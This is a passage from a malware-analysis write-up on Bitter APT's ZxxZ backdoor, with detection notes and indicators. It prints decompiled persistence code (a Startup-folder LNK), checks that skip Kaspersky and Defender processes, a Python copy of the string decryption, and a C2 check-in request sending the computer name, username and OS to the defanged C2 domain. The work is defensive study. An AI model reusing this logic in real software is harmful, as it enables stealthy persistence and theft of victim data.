+</span></span><span class=line><span class=cl>userlog.php?id<span class=o>=</span>
+</span></span><span class=line><span class=cl>WqeC812CCvU/
+</span></span><span class=line><span class=cl>systemlog
+</span></span><span class=line><span class=cl>systemlog
+</span></span><span class=line><span class=cl>tmp.exe
+</span></span></code></pre></td></tr></table></div></div><p>This might be the C2 server and some of it&rsquo;s URI paths and parameters.</p><p>Opening <code>sample_6.bin</code> in <a href=https://github.com/hasherezade/pe-bear-releases target=_blank rel="noopener noreffer">PEBear</a>, shows us that <code>ws2_32.dll</code> is present in the imports. This may give us easier insight to where the C2 communication is happening.</p><p>We can now hypothesize that this is the payload we are looking for.</p><h4 id=initialization>Initialization</h4><p>Once executed, it will use <em><a href=https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-loadstringa target=_blank rel="noopener noreffer">user32.LoadStringA</a></em> to use strings from the resource string table. These strings indicate the project name is <code>NewProject</code>. These kind of artifacts are typically left behind when an application template code in Visual Studio was never provided a name and is certainly a heuristic indicator we can hunt for.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=n>LoadStringA</span><span class=p>(</span><span class=n>hInstance0</span><span class=p>,</span><span class=s>&#34;NewProject_2.1&#34;</span><span class=p>,</span><span class=o>&amp;</span><span class=n>lpWindowName</span><span class=p>,</span><span class=mi>100</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=n>LoadStringA</span><span class=p>(</span><span class=n>hInstance0</span><span class=p>,</span><span class=s>&#34;NEWPROJECTT_21&#34;</span><span class=p>,</span><span class=o>&amp;</span><span class=n>lpClassName</span><span class=p>,</span><span class=mi>100</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=n>RegisterWindowClass</span><span class=p>(</span><span class=n>hInstance0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=n>HINSTANCE_SELF</span> <span class=o>=</span> <span class=n>hInstance</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=n>hWnd</span> <span class=o>=</span> <span class=n>CreateWindowExA</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>	<span class=nb>NULL</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>lpClassName</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>	<span class=o>&amp;</span><span class=n>lpWindowName</span><span class=p>,</span> <span class=n>WS_TILEDWINDOW</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>	<span class=mh>0x80000000</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>	<span class=mh>0x80000000</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>	<span class=p>(</span><span class=n>HWND</span><span class=p>)</span><span class=nb>NULL</span><span class=p>,</span> <span class=p>(</span><span class=n>HMENU</span><span class=p>)</span><span class=nb>NULL</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>	<span class=n>hInstance0</span><span class=p>,</span> <span class=p>(</span><span class=n>LPVOID</span><span class=p>)</span><span class=nb>NULL</span><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><p>Interestingly, they opt to use large negative values for the parameters <code>X</code> and <code>nWidth</code> as <code>0x80000000</code> will be <code>int</code> resulting in <code>-2147483648</code>. I don&rsquo;t believe there is much legitimate purpose to this. Maybe they were worried their window would show on the screen. 😂</p><p>Once completed creating the window, it will perform a decryption routine on the C2 server domain <font style=color:red>subscribe[.]tomcruefrshsvc[.]com</font>. This is performed with the following algorithm.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/7b5b36ad32bca08a519ddc3ed4e57e5be1fc4e1d202ef16687e6825f93fd2abe.png data-srcset="/images/7b5b36ad32bca08a519ddc3ed4e57e5be1fc4e1d202ef16687e6825f93fd2abe.png, /images/7b5b36ad32bca08a519ddc3ed4e57e5be1fc4e1d202ef16687e6825f93fd2abe.png 1.5x, /images/7b5b36ad32bca08a519ddc3ed4e57e5be1fc4e1d202ef16687e6825f93fd2abe.png 2x" data-sizes=auto alt=/images/7b5b36ad32bca08a519ddc3ed4e57e5be1fc4e1d202ef16687e6825f93fd2abe.png title=algo width=1092 height=767>
+<em>Figure 3: String Decryption Algorithm (Simple XOR)</em></p><p>After reverse engineering this algorithm we can implement the same routine in Python.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>EncryptDecrypt</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=n>data</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>	<span class=s2>&#34;&#34;&#34;
+</span></span></span><span class=line><span class=cl><span class=s2>	Bitter APT EncryptDecrypt Strings Function
+</span></span></span><span class=line><span class=cl><span class=s2>	&#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>keylen</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>key</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>keypos</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>data</span><span class=p>)):</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>==</span> <span class=mh>0x00</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>break</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>keypos</span> <span class=o>&gt;=</span> <span class=n>keylen</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>keypos</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>        <span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>^</span> <span class=nb>int</span><span class=p>(</span><span class=n>key</span><span class=p>[</span><span class=n>keypos</span><span class=p>]</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>hex</span><span class=p>(),</span> <span class=n>base</span><span class=o>=</span><span class=mi>16</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>keypos</span> <span class=o>+=</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>data</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>It is also possible to easily decrypt the strings in <a href=https://gchq.github.io/CyberChef/ target=_blank rel="noopener noreffer">CyberChef</a> as well.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/bce8b3a06dd86b0b3532321637cd98e4bf23b60dda18f7b6beee4df1cc34b149.png data-srcset="/images/bce8b3a06dd86b0b3532321637cd98e4bf23b60dda18f7b6beee4df1cc34b149.png, /images/bce8b3a06dd86b0b3532321637cd98e4bf23b60dda18f7b6beee4df1cc34b149.png 1.5x, /images/bce8b3a06dd86b0b3532321637cd98e4bf23b60dda18f7b6beee4df1cc34b149.png 2x" data-sizes=auto alt=/images/bce8b3a06dd86b0b3532321637cd98e4bf23b60dda18f7b6beee4df1cc34b149.png title=cyberchef width=1065 height=522>
+<em>Figure 4: <a href=https://gchq.github.io/CyberChef/ target=_blank rel="noopener noreffer">CyberChef</a> String Decryption</em></p><p>At least here they are using 2-byte XOR keys. 😂</p><p>Then it will start creating a directory path string using <em><a href=https://docs.microsoft.com/en-us/windows/win32/shell/csidl target=_blank rel="noopener noreffer">CSIDL_LOCAL_APPDATA</a></em> (<code>C:\Users\\&lt;username\>\AppData\Local</code>), if this was unsuccessful it will attempt to create <em><a href=https://docs.microsoft.com/en-us/windows/win32/shell/csidl target=_blank rel="noopener noreffer">CSIDL_TEMPLATES</a></em> (<code>C:\Users\\&lt;username\>\Templates</code>) and <em><a href=https://docs.microsoft.com/en-us/windows/win32/shell/csidl target=_blank rel="noopener noreffer">CSIDL_SENDTO</a></em> (<code>C:\Users\\&lt;username\>\SendTo</code>) respectively.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=n>iResult</span> <span class=o>=</span> <span class=n>SHGetFolderPathA</span><span class=p>(</span><span class=nb>NULL</span><span class=p>,</span><span class=n>CSIDL_LOCAL_APPDATA</span><span class=p>,</span><span class=nb>NULL</span><span class=p>,</span><span class=nb>NULL</span><span class=p>,</span><span class=o>&amp;</span><span class=n>PATH</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>((</span><span class=n>iResult</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=n>iResult</span> <span class=o>=</span> <span class=n>SHGetFolderPathA</span><span class=p>(</span><span class=nb>NULL</span><span class=p>,</span><span class=n>CSIDL_TEMPLATES</span><span class=p>,</span><span class=nb>NULL</span><span class=p>,</span><span class=nb>NULL</span><span class=p>,</span><span class=o>&amp;</span><span class=n>PATH</span><span class=p>),</span> <span class=n>iResult</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=n>SHGetFolderPathA</span><span class=p>(</span><span class=nb>NULL</span><span class=p>,</span><span class=n>CSIDL_SENDTO</span><span class=p>,</span><span class=nb>NULL</span><span class=p>,</span><span class=nb>NULL</span><span class=p>,</span><span class=o>&amp;</span><span class=n>PATH</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>Once completed, it will call <code>strcat_s</code> to append the path with string <code>\\\\Updates</code>. It will then call <code>\_mkdir</code> to create the directory <code>C:\\Users\\username\\\&lt;path-type\>\\Updates</code>. Execution will continue until it appends the path with the string <code>systemlog</code>, in a very redundant way. 😂</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/0c01f54a2e19f5f43cac4ed95810c64aaa08c870c50418f319acc68a2e25f470.png data-srcset="/images/0c01f54a2e19f5f43cac4ed95810c64aaa08c870c50418f319acc68a2e25f470.png, /images/0c01f54a2e19f5f43cac4ed95810c64aaa08c870c50418f319acc68a2e25f470.png 1.5x, /images/0c01f54a2e19f5f43cac4ed95810c64aaa08c870c50418f319acc68a2e25f470.png 2x" data-sizes=auto alt=/images/0c01f54a2e19f5f43cac4ed95810c64aaa08c870c50418f319acc68a2e25f470.png title=systemlog width=951 height=483>
+<em>Figure 5: Obfuscated but not really string &lsquo;systemlog&rsquo;.</em></p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/3cdc0c53e4da1e590203cb99635a6d7f1b613eb5975a4b1522af12ab63017205.jpg data-srcset="/images/3cdc0c53e4da1e590203cb99635a6d7f1b613eb5975a4b1522af12ab63017205.jpg, /images/3cdc0c53e4da1e590203cb99635a6d7f1b613eb5975a4b1522af12ab63017205.jpg 1.5x, /images/3cdc0c53e4da1e590203cb99635a6d7f1b613eb5975a4b1522af12ab63017205.jpg 2x" data-sizes=auto alt=/images/3cdc0c53e4da1e590203cb99635a6d7f1b613eb5975a4b1522af12ab63017205.jpg title=obfuscation_fail width=975 height=343></p><p>It will then call <em><a href=https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-sleep target=_blank rel="noopener noreffer">kernel32.Sleep</a></em> to sleep for 30 seconds. Once it has finished sleeping, it will check for the presence of the process <code>avp</code> (<a href=https://www.kaspersky.ca/ target=_blank rel="noopener noreffer">Kaspersky</a>) and <code>MsMp</code> (Microsoft Security Monitor Process) and only establish persistence if those security processes are not present on the system. At least they are making an effort here to be stealthy and infect only poorly secured machines.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=n>bResult</span> <span class=o>=</span> <span class=n>IsProcess</span><span class=p>(</span><span class=s>&#34;avp&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>((</span><span class=n>bResult</span> <span class=o>==</span> <span class=n>FALSE</span><span class=p>)</span> <span class=o>&amp;&amp;</span>
+</span></span><span class=line><span class=cl>	<span class=p>(</span><span class=n>bResult</span> <span class=o>=</span> <span class=n>IsProcess</span><span class=p>(</span><span class=s>&#34;MsMp&#34;</span><span class=p>),</span>
+</span></span><span class=line><span class=cl>	<span class=n>bResult</span> <span class=o>==</span> <span class=n>FALSE</span><span class=p>)){</span>
+</span></span><span class=line><span class=cl>	<span class=n>Persistence</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><h4 id=persistence>Persistence</h4><p>To establish persistence, it will create the LNK file <code>%UserProfile%\Start Menu\Programs\Startup\update.LNK</code>, which points to <code>%UserProfile%\AppData\Local\Updates\update.exe</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=n>HRESULT</span> <span class=nf>Persistence</span><span class=p>(</span><span class=kt>void</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>  <span class=cm>/*
+</span></span></span><span class=line><span class=cl><span class=cm>  Bitter APT Persistence Function
+</span></span></span><span class=line><span class=cl><span class=cm>  */</span>
+</span></span><span class=line><span class=cl>  <span class=n>HRESULT</span> <span class=n>hResult</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>cStartupPathLNK</span> <span class=p>[</span><span class=mi>250</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  <span class=n>CoInitialize</span><span class=p>((</span><span class=n>LPVOID</span><span class=p>)</span><span class=nb>NULL</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>Sleep</span><span class=p>(</span><span class=mi>1000</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>cStartupPathLNK</span><span class=p>.</span><span class=n>_0_2_</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=n>memset</span><span class=p>(</span><span class=n>cStartupPathLNK</span> <span class=o>+</span> <span class=mi>2</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>248</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>hResult</span> <span class=o>=</span> <span class=n>SHGetFolderPathA</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>	  <span class=p>(</span><span class=n>HWND</span><span class=p>)</span><span class=nb>NULL</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>	  <span class=n>CSIDL_STARTUP</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>	  <span class=p>(</span><span class=n>HANDLE</span><span class=p>)</span><span class=nb>NULL</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>	  <span class=nb>NULL</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>	  <span class=n>cStartupPathLNK</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>hResult</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>                    <span class=cm>/* %StartUp%\\update.lnk */</span>
+</span></span><span class=line><span class=cl>    <span class=n>strcat_s</span><span class=p>(</span><span class=n>cStartupPathLNK</span><span class=p>,</span><span class=mi>250</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\\</span><span class=s>&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>strcat_s</span><span class=p>(</span><span class=n>cStartupPathLNK</span><span class=p>,</span><span class=mi>250</span><span class=p>,</span><span class=n>s_update_00406bb8</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>strcat_s</span><span class=p>(</span><span class=n>cStartupPathLNK</span><span class=p>,</span><span class=mi>250</span><span class=p>,</span><span class=s>&#34;.&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>strcat_s</span><span class=p>(</span><span class=n>cStartupPathLNK</span><span class=p>,</span><span class=mi>250</span><span class=p>,</span><span class=s>&#34;l&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>strcat_s</span><span class=p>(</span><span class=n>cStartupPathLNK</span><span class=p>,</span><span class=mi>250</span><span class=p>,</span><span class=s>&#34;n&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>strcat_s</span><span class=p>(</span><span class=n>cStartupPathLNK</span><span class=p>,</span><span class=mi>250</span><span class=p>,</span><span class=s>&#34;k&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>hResult</span> <span class=o>=</span> <span class=n>CreateStartupLNK</span><span class=p>(</span><span class=n>cStartupPathLNK</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=n>CoUninitialize</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>hResult</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>The <code>CreateStartupLNK</code> function, shown above, uses the COM Interface <code>Shortcut->IShellLinkA</code>. This corresponds to the following COM GUIDs.</p><table><thead><tr><th>GUID</th><th>Type</th><th>Name</th></tr></thead><tbody><tr><td>00021401-0000-0000-c000-000000000046</td><td>CLSID</td><td>Shortcut</td></tr><tr><td>000214EE-0000-0000-C000-000000000046</td><td>InterfaceID</td><td><a href=https://docs.microsoft.com/en-us/windows/win32/api/shobjidl_core/nn-shobjidl_core-ishelllinka target=_blank rel="noopener noreffer">IShellLinkA</a></td></tr></tbody></table><p>It will also set the LNK comment to <code>App</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=n>hResult</span> <span class=o>=</span> <span class=n>CoCreateInstance</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>	<span class=p>(</span><span class=n>IID</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=mo>00021401</span><span class=o>-</span><span class=mo>0000</span><span class=o>-</span><span class=mo>0000</span><span class=o>-</span><span class=n>c000</span><span class=o>-</span><span class=mo>000000000046</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>	<span class=p>(</span><span class=n>LPUNKNOWN</span><span class=p>)</span><span class=nb>NULL</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>	<span class=mi>1</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=p>(</span><span class=n>IID</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=mo>000214</span><span class=n>EE</span><span class=o>-</span><span class=mo>0000</span><span class=o>-</span><span class=mo>0000</span><span class=o>-</span><span class=n>C000</span><span class=o>-</span><span class=mo>000000000046</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=o>&amp;</span><span class=n>ppv</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=o>-</span><span class=mi>1</span> <span class=o>&lt;</span> <span class=n>hResult</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=n>pszFile</span> <span class=o>=</span> <span class=p>(</span><span class=n>LPCSTR</span><span class=p>)</span><span class=n>pszFileCheck</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>iLength</span> <span class=o>=</span> <span class=n>lstrlenA</span><span class=p>(</span><span class=o>&amp;</span><span class=n>PATH</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=n>rLength</span> <span class=o>=</span> <span class=n>iLength</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>LocalRealloc</span><span class=p>(</span><span class=o>&amp;</span><span class=n>pszFile</span><span class=p>,</span><span class=n>pszFileCheck</span><span class=p>,</span><span class=n>rLength</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=n>eError</span> <span class=o>=</span> <span class=n>memcpy_s</span><span class=p>(</span><span class=n>pszFile</span><span class=p>,</span><span class=n>rLength</span><span class=p>,</span><span class=o>&amp;</span><span class=n>PATH</span><span class=p>,</span><span class=n>rLength</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=n>ExceptionHandler</span><span class=p>(</span><span class=n>eError</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=p>(</span><span class=o>*</span><span class=n>ppv</span><span class=o>-&gt;</span><span class=n>lpVtbl</span><span class=o>-&gt;</span><span class=n>SetPath</span><span class=p>)(</span><span class=n>ppv</span><span class=p>,</span><span class=n>pszFile</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=c1>// ...
+</span></span></span></code></pre></td></tr></table></div></div><p>Once the LNK in has been created in the startup folder, it will sleep for 20 seconds. Then it will copy itself to <code>%UserProfile%\AppData\Local\Updates\tmp.exe</code>. It will then create a handle to the file <code>%UserProfile%\AppData\Local\Updates\systemlog</code>, and write the characters <code>aa</code>.</p><p>Interestingly, at this stage it will use <em><a href=https://docs.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecutea target=_blank rel="noopener noreffer">shell32.ShellExecuteA</a></em> to execute <code>%UserProfile%\AppData\Local\Updates\tmp.exe</code> (itself) before exiting its own process.</p><p>Once the <code>tmp.exe</code> (itself) has been executed again, it will skip over the persistence mechenisims discussed previously and begin collecting information about the machine. This information includes the <code>username</code>, <code>computername</code> and <code>productname</code>. This data will be stored in the URI parameter string <code>\&lt;ComputerName\>&&user=\&lt;Username\>&&OsI=\&lt;ProductName\></code>.</p><p>It will then call <em><a href=https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-copyfileexa target=_blank rel="noopener noreffer">kernel32.CopyFileExA</a></em> to copy the aforementioned <code>tmp.exe</code> to <code>update.exe</code>. The following is the directory listing where the payload is stored for persistence.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>PS C:\Users\malware\AppData\Local\Updates&gt; ls
+</span></span><span class=line><span class=cl>    Directory: C:\Users\malware\AppData\Local\Updates
+</span></span><span class=line><span class=cl>Mode                LastWriteTime     Length Name
+</span></span><span class=line><span class=cl>----                -------------     ------ ----
+</span></span><span class=line><span class=cl>-a---         6/29/2022  11:07 PM          2 systemlog  (To check if installed)
+</span></span><span class=line><span class=cl>-a---         6/29/2022   6:47 AM      53248 tmp.exe    (Payload)
+</span></span><span class=line><span class=cl>-a---         6/29/2022   6:47 AM      53248 update.exe (Payload)
+</span></span></code></pre></td></tr></table></div></div><p>Persistence has now been established as it will surivive a reboot.</p><h4 id=c2-communication>C2 Communication</h4><p>Bitter APT&rsquo;s ZxxZ backdoor follows a minimal approach to C2 communication. The only command sent by the C2 server is the payload to execute next. This ensures that they can deploy new payloads at will anytime persistence is achieved. However, it will communicate with the C2 server every 17 seconds regardless if it has received any new payloads or not, which does generate noise on the infected network.</p><p>No payload is perfect. However, I can certainly see its appeal for a large scale offensive campaign from an operational perspective.</p><h5 id=behavior>Behavior</h5><p>The overall C2 behavior can be explained as follows.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/6e0af10a5030fa409da15edbd6750a489f14cbc2fd90b11be6abd88c2cf54793.png data-srcset="/images/6e0af10a5030fa409da15edbd6750a489f14cbc2fd90b11be6abd88c2cf54793.png, /images/6e0af10a5030fa409da15edbd6750a489f14cbc2fd90b11be6abd88c2cf54793.png 1.5x, /images/6e0af10a5030fa409da15edbd6750a489f14cbc2fd90b11be6abd88c2cf54793.png 2x" data-sizes=auto alt=/images/6e0af10a5030fa409da15edbd6750a489f14cbc2fd90b11be6abd88c2cf54793.png title=c2-overview width=1199 height=776>
+<em>Figure 6: High Level C2 Behavior Overview</em></p><p>Now that we understand the high level concepts, let&rsquo;s discuss the details and see what the C2 traffic looks like.</p><p>Once persistence has been established, it will communicate to the C2 server using the string we identified earlier as the URI parameters.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/VcvNbtgRrPopqSD/SzWvcxuer/userlog.php?id=MALWARE-PC&amp;&amp;user=yourmom&amp;&amp;OsI=Windows7Ultimate</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
+</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span><span class=l>subscribe[.]tomcruefrshsv[.]com</span>
+</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
+</span></span></code></pre></td></tr></table></div></div><p>The C2 checkin URI parameters are as follows.</p><table><thead><tr><th>URI Parameter</th><th>Description</th></tr></thead><tbody><tr><td>id</td><td>ComputerName</td></tr><tr><td>user</td><td>Username</td></tr><tr><td>OsI</td><td>ProductName</td></tr></tbody></table><p>Threat actors don&rsquo;t often realize that the omission of the <code>User-Agent</code> header makes the communication identifiable amongst legitimate browsing traffic. Not only this, but they are using <code>&&</code> for additional URI parameters. The standard is to use only one <code>&</code>, making this even more identifiable. It is common practice to pick on these mistakes and write very effective detection.</p><p>By using <code>dnsmasq</code> to change the C2 domain IP address it will allow us to write our own C2 server code to interact with the malware. Using <code>nslookup</code> we can confirm the C2 domain is now resolving to a local IP address we control.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>PS C:\Users\malware&gt; nslookup subscribe.tomcruefrshsvc.com
+</span></span><span class=line><span class=cl>Name:    subscribe.tomcruefrshsvc.com
+</span></span><span class=line><span class=cl>Address:  10.0.2.1
